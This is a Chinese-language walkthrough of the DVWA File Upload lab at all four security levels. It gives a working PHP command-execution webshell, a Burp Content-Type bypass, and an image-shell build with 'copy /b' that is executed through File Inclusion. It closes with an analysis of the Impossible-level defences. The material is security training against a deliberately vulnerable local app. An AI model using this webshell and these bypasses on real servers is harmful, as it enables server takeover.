DVWA-File Upload

- 含义

定义

文件上传漏洞：Web 应用程序在接收用户上传文件时，没有对文件进行充分的安全校验（扩展名、Content-Type、文件内容），导致攻击者可以上传恶意脚本文件（如 PHP webshell），并通过 URL 访问触发执行，从而获得服务器控制权。

简单一句话：本该只能传图片，结果传了个 PHP 脚本上去还执行了。

- 漏洞原理

正常流程是这样的：

用户上传头像/附件

↓

服务器接收文件

↓

（⚠️ 这里应该校验：是不是真的图片？）

↓

保存到上传目录

↓

后续可通过 URL 访问该文件

漏洞发生在校验这一步缺失或可绕过。攻击者把 .php 文件伪装成图片上传，服务器没识别出来就保存了，攻击者再通过 URL 访问这个文件，Web 服务器把 .php 交给 PHP 引擎执行，攻击者的恶意代码就运行了。

- 攻击成功的三个核心条件

这是 File Upload 漏洞的关键——三个条件缺一不可：

| 条件 | 说明 | DVWA Low 级是否满足 |
|---|---|---|
| ① 上传成功 | 服务器接受了文件并存盘 | ✅ 零校验，直接存 |
| ② 可访问 | 上传目录在 web 根下，能用 URL 访问到 | ✅ `hackable/uploads/` 在 dvwa 下 |
| ③ 可执行 | 文件扩展名被 Web 服务器当作脚本执行 | ✅ `.php` 被 Nginx 交给 PHP 引擎 |

只要砍断任意一个条件，攻击就失败：

砍条件①：严格校验扩展名/内容（Medium/High/Impossible 的思路）

砍条件②：上传目录放 web 根之外（DVWA 没这么做）

砍条件③：上传目录禁止执行 PHP（.htaccess 禁止 PHP 解析）

- 危害等级

File Upload 是所有 Web 漏洞里危害最直接的之一，因为成功的文件上传可以直接 getshell（获得服务器命令执行权限）：

| 危害 | 能做什么 |
|---|---|
| 🔴 最严重 | 直接 getshell → 完全控制服务器 → 内网渗透跳板 |
| 🟠 严重 | 上传钓鱼页面 / 非法内容，借合法站点传播 |
| 🟡 中等 | 上传大文件耗尽磁盘空间（DoS） |
| 🟢 较轻 | 覆盖现有文件（如果文件名可控制） |

对比之前学的漏洞：

| 漏洞 | 危害路径 | 难度 |
|---|---|---|
| Command Injection | 直接命令执行 | 最直接，但只能执行预设命令 |
| File Inclusion (LFI) | 读文件 / 读源码 | 需要拼路径，不能直接执行任意代码 |
| File Upload | 上传任意代码并执行 | 最严重——getshell 后等于什么都拿到了 |

5、与 File Inclusion 的关系（重要衔接点）

| 对比 | File Inclusion | File Upload |
|---|---|---|
| 攻击本质 | include 用户控制的路径 | include/执行用户上传的文件 |
| 文件来源 | 服务器上已存在的文件 | 攻击者新上传的文件 |
| 单独危害 | 读文件、读源码（LFI） | 上传但不一定能执行 |
| 组合危害 | File Upload + File Inclusion = 必 getshell |  |

组合攻击场景（这个在 High 级会用到）：

情况: 服务器校验严格，只能上传图片(.jpg)，不能上传 .php

↓

攻击者: 上传一个"图片马"——jpg 文件里嵌入 PHP 代码

↓

图片上传成功（通过了图片校验）

↓

但 .jpg 不会被 PHP 引擎执行，攻击链断 ❌

↓

攻击者: 配合 File Inclusion 漏洞！

↓

?page=hackable/uploads/shell.jpg

↓

include() 把 .jpg 当 PHP 执行 → 里面的代码运行 → getshell ✅

这就是为什么这两个模块连续学习——它们单独可能危害有限，组合起来就是致命的。DVWA 的 File Upload High 级就暗含这个考点。

6、四级防御思路预告

| 级别 | 防御方式 | 预期绕过思路 |
|---|---|---|
| Low | 无校验 | 直接传 .php |
| Medium | 检查 Content-Type | 抓包改 Content-Type |
| High | 检查扩展名 + getimagesize() | 制作图片马 + File Inclusion 配合 |
| Impossible | 重建图片 + 随机文件名 + CSRF token | 无绕过 |

- Low级

- 源码分析

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_001.png)

1）防御机制：无

Low 级零校验——把用户上传的文件直接 move_uploaded_file 移到 hackable/uploads/ 目录，文件名用原始文件名（basename 只是去掉路径部分，防止 ../../shell.php 路径穿越，但不阻止 .php 扩展名）。

2）关键信息

| 项目 | 值 |
|---|---|
| 上传目录（磁盘） | E:\phpstudy_pro\WWW\dvwa\hackable\uploads\ |
| 上传目录（访问） | http://localhost/dvwa/hackable/uploads/ |
| 文件名处理 | basename($_FILES['uploaded']['name']) — 保留原始文件名，只去路径 |
| 校验内容 | 无（不看扩展名、不看 Content-Type、不看文件内容） |

3）攻击思路

直接上传一个 .php 文件（webshell），上传后通过浏览器访问它，PHP 引擎会执行这个文件——直接 getshell。

- 实操

- 准备webshell文件

先在电脑上创建一个简单的 PHP 文件。我们可以用两种 shell，从简单到实用：

（1）（最简单，验证用）——一句话查看PHP配置：

<?php phpinfo(); ?>

保存为 shell.php

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_002.png)

（2）（实用webshell）——命令执行：

<?php system($_GET['cmd']); ?>

保存为 shell2.php

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_003.png)

建议先用（1）phpinfo() 验证上传+执行链路通了，再用（2）system() 做实际命令执行，这样循序渐进

- 上传文件

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_004.png)

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_005.png)

- 访问上传文件，验证getshell

- phpinfo版本：

http://localhost/dvwa/hackable/uploads/shell.php

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_006.png)

结果：显示完整的 PHP 配置页面（phpinfo 表格）——证明 PHP 代码被执行了。

（2）system命令执行版本：

http://localhost/dvwa/hackable/uploads/shell2.php?cmd=whoami

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_007.png)

结果：输出当前用户名（如 desktop-xxx\www-data）

试试其他命令：

?cmd=dir                    # 列目录

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_008.png)

?cmd=ipconfig               # 查网络配置

?cmd=tasklist               # 查进程

（3）webshell 的本质：一段能接收攻击者输入并执行的 PHP 代码。

phpinfo() 版：只读不写，验证"PHP 代码能执行"这个事实，安全无害

system($_GET['cmd']) 版：可执行任意命令，是真正的 webshell，危害最大

实战中攻击者会上传更复杂的 webshell（如中国蚁剑/哥斯拉连接的一句马），但原理相同：让 PHP 引擎执行攻击者控制的代码。

- 理解攻击链路

[1] 上传 shell.php

↓

[2] 服务器无校验，move_uploaded_file 移到 hackable/uploads/shell.php

↓

[3] 文件保留 .php 扩展名

↓

[4] 浏览器访问 http://localhost/dvwa/hackable/uploads/shell.php

↓

[5] Nginx 把 .php 请求交给 PHP 引擎处理

↓

[6] PHP 引擎执行 shell.php 中的代码

↓

[7] 攻击者通过 ?cmd= 参数传入命令，system() 执行

↓

[8] 命令输出返回浏览器 → getshell ✅

关键环节：第 4 步——上传目录 hackable/uploads/ 必须在 web 根目录下且可被访问。如果上传目录在 web 根之外（比如 /tmp/uploads/），即使上传成功也无法通过 URL 访问到，攻击链断开。

5）关键结论

- Low 级根本缺陷: 不校验扩展名、不校验 Content-Type、不校验文件内容

- 上传目录必须在 web 可访问范围内（否则无法触发执行）

- .php 扩展名是触发 PHP 引擎执行的关键

- 攻击成功的三个核心条件: 上传成功 + 可访问 + 可执行（Low 级三个全满足）

- Medium级

1、源码分析

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_009.png)

1）防御机制拆解

Medium 级加了两个检查，比 Low 级多了一层：

| 检查项 | 代码 | 作用 |
|---|---|---|
| Content-Type 检查 | $uploaded_type == "image/jpeg" \|\| "image/png" | 限制 MIME 类型为 jpeg/png |
| 文件大小检查 | $uploaded_size < 100000 | 限制 100KB 以下 |

关键缺陷：只检查 Content-Type，不检查扩展名

这是 Medium 级的核心问题。我们需要先理解一个 HTTP 基础知识：

2）文件上传的 HTTP 请求结构

POST /dvwa/vulnerabilities/upload/ HTTP/1.1

Host: localhost

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary

Content-Disposition: form-data; name="uploaded"; filename="shell.php"

Content-Type: application/octet-stream   ← 这是 $_FILES['uploaded']['type'] 的来源

<?php system($_GET['cmd']); ?>

------WebKitFormBoundary--

关键点：Content-Type: application/octet-stream 这一行完全由客户端控制！浏览器根据文件扩展名自动填写：

.php → application/octet-stream

.jpg → image/jpeg

.png → image/png

但攻击者可以用 Burp Suite 抓包，把这一行改成 image/jpeg，服务器就以为这是图片。

3）与 Low 级的核心差异

| 对比 | Low 级 | Medium 级 |
|---|---|---|
| 检查扩展名 | ❌ | ❌（仍然不检查！） |
| 检查 Content-Type | ❌ | ✅（但可伪造） |
| 检查文件大小 | ❌ | ✅（100KB） |
| 文件名处理 | 原始文件名 | 原始文件名（仍保留 .php） |

关键发现：Medium 级虽然加了 Content-Type 检查，但仍然不检查文件扩展名，文件名仍用原始名——这意味着：

抓包把 Content-Type 改成 image/jpeg

服务器校验通过

但文件名仍然是 shell2.php

访问时仍被 PHP 引擎执行 → getshell

攻击思路：Burp Suite 抓包改 Content-Type

[1] 准备 shell2.php（和 Low 级一样的内容）

[2] 浏览器上传 shell2.php，但用 Burp 拦截请求

[3] 在 Burp 里把 Content-Type: application/octet-stream 改成 image/jpeg

[4] 放行请求

[5] 服务器检查 Content-Type=image/jpeg → 通过

[6] 文件名仍是 shell2.php → 保存为 shell2.php

[7] 访问 http://localhost/dvwa/hackable/uploads/shell2.php?cmd=whoami → getshell

2、实操

1）直接上传shell.php（失败对照）

选择 shell2.php（system 版 webshell）

开启 Burp 拦截，点击 Upload

在 Burp 里看到请求，先不改，直接 Forward 放行

回到浏览器看结果

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_010.png)

原因：shell2.php 的 Content-Type 是 application/octet-stream，不在白名单里。

2）抓包改Content-Type（绕过）

重复上传 shell2.php，Burp 拦截请求

在 Burp 的请求里找到这一行：

Content-Type: application/octet-stream

把它改成：

Content-Type: image/jpeg

- Forward 放行请求

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_011.png)

3）验证getshell

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_012.png)

- 关键结论

- Content-Type 是 HTTP 请求头，客户端可控，不能作为安全校验依据

- Medium 级的防御只看了"标签"没看"内容"——扩展名才是关键

- 真正的校验应该检查文件扩展名 + 文件内容（见 High 级）

- High级

- 源码分析

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_013.png)

1）	防御机制拆解

High 级做了三重检查，比 Medium 严格得多：

| 检查项 | 代码 | 作用 |
|---|---|---|
| 扩展名白名单 | strtolower($uploaded_ext) == "jpg"\|\|"jpeg"\|\|"png" | 只允许 jpg/jpeg/png 扩展名 |
| 文件大小 | $uploaded_size < 100000 | 限制 100KB 以下 |
| 图片内容验证 | getimagesize($uploaded_tmp) | 验证文件是否是真实图片 |

2）关键函数解析

（1）扩展名提取：substr + strrpos

$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);

strrpos($name, '.') — 找最后一个 . 的位置

substr($name, pos + 1) — 取最后一个 . 之后的内容

例如 shell.jpg → 找到最后一个 . 在位置 5 → substr 从位置 6 开始 → 得到 jpg。

用最后一个 . 而不是第一个：防止 shell.php.jpg 这种双扩展名绕过——提取出的是 jpg，通过校验。

strtolower 转小写：防止 shell.PHP、shell.PhP 大小写绕过。

（2）图片内容验证：getimagesize()

getimagesize( $uploaded_tmp )

这是 High 级的核心防御。getimagesize() 不只是看文件名，而是读取文件头部数据，判断是否是有效图片格式：

| 图片格式 | 文件头标识 |
|---|---|
| JPEG | FF D8 FF |
| PNG | 89 50 4E 47 |
| GIF | 47 49 46 38 |

如果文件头不是有效图片格式，getimagesize() 返回 false，校验失败。

3）三级防御对比

| 检查项 | Low | Medium | High |
|---|---|---|---|
| 扩展名 | ❌ | ❌ | ✅ jpg/jpeg/png 白名单 |
| Content-Type | ❌ | ✅ | ❌（不再检查，因为扩展名更可靠） |
| 文件大小 | ❌ | ✅ | ✅ |
| 文件内容 | ❌ | ❌ | ✅ getimagesize |

（1）High 级的防御逻辑：

先看扩展名（白名单）→ 只允许图片扩展名

再看文件内容（getimagesize）→ 必须是真实图片

两层都通过才允许上传

（2）攻击思路：图片马 + File Inclusion 配合

High 级的防御很强：

扩展名必须是 jpg/jpeg/png → 不能传 .php

内容必须是真实图片 → 不能伪造 Content-Type 绕过

单独看 File Upload，High 级无法 getshell——因为即使上传成功，.jpg 文件不会被 PHP 引擎执行。

但是！ 如果配合 File Inclusion 漏洞，就可以突破这个限制：

- [1] 制作"图片马"：真实图片 + PHP 代码

- ↓

- [2] 上传到 hackable/uploads/shell.jpg（通过 High 级所有校验）

- ↓

- [3] .jpg 本身不会被执行，攻击链暂时断开 ❌

- ↓

- [4] 切到 File Inclusion 模块（Low/Medium/High 都行）

- ↓

- [5] ?page=hackable/uploads/shell.jpg

- ↓

- [6] include() 把 .jpg 当 PHP 执行 → 里面的 PHP 代码运行 → getshell ✅

这就是 File Upload + File Inclusion 的组合攻击

- 实操

1）制作图片马

图片马 = 真实图片 + PHP 代码追加在末尾。

（1）方法：用 Windows 的 copy 命令合并

copy /b normal.jpg + shell2.php shell.jpg

/b 表示二进制合并

normal.jpg 是一个真实图片（你可以从 DVWA 的 hackable/uploads/ 里找现成的，或者自己截个图）

shell2.php 是你的 <?php system($_GET['cmd']); ?>

shell.jpg 是合并后的图片马

- 操作：

1. 准备一个正常图片，重命名为 normal.png

2. 确保你的 shell2.php（<?php system($_GET['cmd']); ?>）在同一个目录

3. 打开 cmd，cd 到这个目录

4. 执行 copy /b normal.png + shell2.php shell.png

5. 生成 shell.png——它既是有效图片（通过 getimagesize），末尾又包含 PHP 代码

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_014.png)

2）上传图片马

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_015.png)

为什么能通过：

扩展名 jpg ✅ 在白名单

文件大小 < 100KB ✅

getimagesize() ✅ 文件头是真实 JPEG

3）直接访问验证（预期失败）

http://localhost/dvwa/hackable/uploads/shell.jpg?cmd=whoami

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_016.png)

原因：.jpg 扩展名不会被 Nginx 交给 PHP 引擎执行，只是当作普通图片显示。攻击链在这里断开。

4）配合File Inclusion触发执行（getshell）

切到 File Inclusion 模块

安全级别可以是 Low（最简单，直接用相对路径）

访问：http://localhost/dvwa/vulnerabilities/fi/?page=file:////E:/phpstudy_pro/WWW/hackable/uploads/shell.jpg&cmd=whoami

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_017.png)

为什么能成功：

include('hackable/uploads/shell.jpg') 把整个文件当 PHP 执行

文件开头的图片二进制数据被当作 HTML 输出（乱码）

但 PHP 引擎扫描到 <?php 标签时，开始执行 PHP 代码

system($_GET['cmd']) 执行了 whoami，输出用户名

5）试试其他命令

?page=file:////E:/phpstudy_pro/WWW/hackable/uploads/shell.jpg&cmd=ipconfig

?page=file:////E:/phpstudy_pro/WWW/hackable/uploads/shell.jpg&cmd=dir

- 关键总结

- High 级单独防御足够强，但无法防御"上传+包含"的组合攻击

- 图片马的本质: 真实图片头 + PHP 代码尾，绕过 getimagesize

- 真正的安全需要: 上传目录禁止执行 PHP + 不存在 File Inclusion 漏洞

- 见 Impossible 级: 重编码图片（抹掉尾部 PHP 代码）+ 随机文件名

- Impossible 级

1、源码分析

![](images/7-DVWA-File-Upload-文件上传漏洞/7-DVWA-File-Upload-文件上传漏洞_018.png)

防御点①：Anti-CSRF Token

页面表单带一个 user_token，上传时必须和 Session 里的 session_token 一致。效果：攻击者无法用跨站请求（CSRF）或脚本诱导你自动上传恶意文件——每次都要从表单里拿一个新鲜 token。

防御点②：扩展名白名单 + 随机化文件名

扩展名必须是 jpg / jpeg / png 之一

关键：即使你传 shell.php，$uploaded_ext 是 php，直接不满足条件 → 拒绝。而且文件名被重写为 bin2hex(random_bytes(16)).jpg（32 位十六进制随机串），你无法预测最终文件名，即使绕过其他校验也无法直接访问。

防御点③：多重校验 AND 关系

if( ( strtolower( $uploaded_ext ) == 'jpg' || ... == 'png' ) &&   // 扩展名白名单	( $uploaded_size < 100000 ) &&                     // 大小 < 100KB	( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&  // MIME 校验

getimagesize( $uploaded_tmp ) )                     // 真实图片内容校验

四个条件全部满足才会继续，任何一项失败直接拒绝。

防御点④：图片重编码（最狠的一招）

if( $uploaded_type == 'image/jpeg' ) {

$img = imagecreatefromjpeg( $uploaded_tmp );

imagejpeg( $img, $temp_file, 100);

} else {

$img = imagecreatefrompng( $uploaded_tmp );

imagepng( $img, $temp_file, 9);

}

这是彻底消灭图片马的核心：用 GD 库把图片重新解码再重新编码成一张全新的图片。你拼接在图片尾部的 <?php system(...) 会被直接丢弃，因为 GD 只保留图像数据本身。就算前面全部绕过，这一步也会把你的 webshell 代码清除。

为什么 High 的图片马在 Impossible 下必然失败

| 校验项 | High 级 | Impossible级 |
|---|---|---|
| 扩展名 | jpg/jpeg/png 白名单 | 同样白名单 |
| MIME | 不校验（只靠扩展名） | 校验 Content-Type |
| 文件内容 | getimagesize() 校验是图片 | 也是图片 ✅ |
| 重编码 | ❌ 没有 | ✅ 有，清除附加代码 |
| 文件名 | 保留原文件名 | 随机化，无法预测 |

所以就算你在 High 能用的图片马原样提交到 Impossible：能通过"是图片"的校验，但 GD 重编码会把尾部 PHP 代码删掉，最终存到硬盘的是一张纯净图片，还是随机文件名，你连路径都猜不到。三重防御互相独立，无法组合绕过。

2、实操

和 FI 的 Impossible 一样，演示"无法绕过" 并记录笔记：

操作 1：正常功能验证（证明不是模块坏了）

切到 Impossible 安全级别（DVWA Security）

随便挑一张正常小图（比如网页上右键另存的 PNG，或之前 normal.png）

正常上传 → 应该显示 {随机文件名}.png succesfully uploaded!

观察返回的链接，确认文件名是一串随机十六进制，而不是你的原名

操作 2：尝试攻击（演示被拒）

上传 shell2.php → 提示 Your image was not uploaded. We can only accept JPEG or PNG images.

上传带 PHP 代码的图片马 → 看看会发生什么（预期：上传"成功"，但 GD 重编码后 PHP 代码没了；如果你拿 shell.jpg 试，上传后下载回来看末尾，<?php 已被清除）

操作 3：验证重编码清除代码（进阶，强烈建议做）

用之前 High 级的 shell.jpg 上传

从 uploads 目录下载回来，用记事本看文件末尾 → <?php system(...) 消失，只剩纯图片数据

操作 4：观察 CSRF token

查看 Impossible 页面的表单源码，找到 <input type="hidden" name="user_token" value="...">

刷新页面，token 会变 —— 这就是 Anti-CSRF 的机制

3、关键结论

Impossible 防御体系（生产级参考）:

1. Anti-CSRF token → 防跨站伪造上传

2. 扩展名白名单 (jpg/jpeg/png) + 随机文件名 → 防直接访问/预测路径

3. 大小 <100KB + MIME 校验 + getimagesize() 内容校验 → 多重 AND 过滤

4. GD 图片重编码 → 彻底清除图片马中的附加代码（最关键）

结论: 四层互相独立，任意组合都无法绕过 → 无法 getshell
